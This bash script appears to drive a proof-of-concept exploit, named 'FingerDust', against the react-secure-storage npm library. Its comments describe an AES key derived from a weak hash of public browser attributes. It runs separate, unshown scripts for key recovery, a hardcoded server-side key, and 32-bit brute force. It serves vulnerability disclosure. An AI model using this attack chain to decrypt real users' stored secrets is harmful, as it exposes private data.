#!/usr/bin/env bash
# FingerDust PoC — react-secure-storage derives its AES key from a 32-bit
# non-crypto hash of PUBLIC browser attributes (+ a hardcoded constant).
#
# Self-contained: `npm install` pulls the REAL react-secure-storage@1.3.2.
set -e
cd "$(dirname "$0")"

# Fixed timezone so the victim's fingerprint is reproducible across machines.
export TZ="Etc/GMT+5"

if [ ! -d node_modules/react-secure-storage ]; then
  echo "== installing the REAL react-secure-storage (+ its crypto-js/murmurhash-js deps) =="
  npm install --no-audit --no-fund >/dev/null 2>&1
fi

echo
echo "########################################################################"
echo "# VICTIM: store secrets with the real, unmodified react-secure-storage #"
echo "########################################################################"
node victim_store.js

echo
echo "########################################################################"
echo "# ATTACK 1: reconstruct the key from PUBLIC data, recover all secrets   #"
echo "########################################################################"
node attacker_env_recover.js

echo
echo "########################################################################"
echo "# VERIFY: attacker output vs. the library's real key & plaintext        #"
echo "########################################################################"
node verify.js

echo
echo "########################################################################"
echo "# ATTACK 2: SSR path — key is a universal hardcoded constant            #"
echo "########################################################################"
node ssr_universal_key.js

echo
echo "########################################################################"
echo "# ATTACK 3: the 32-bit ceiling — blind brute force is trivial           #"
echo "########################################################################"
node entropy_bruteforce.js

echo
echo "All demonstrations completed."
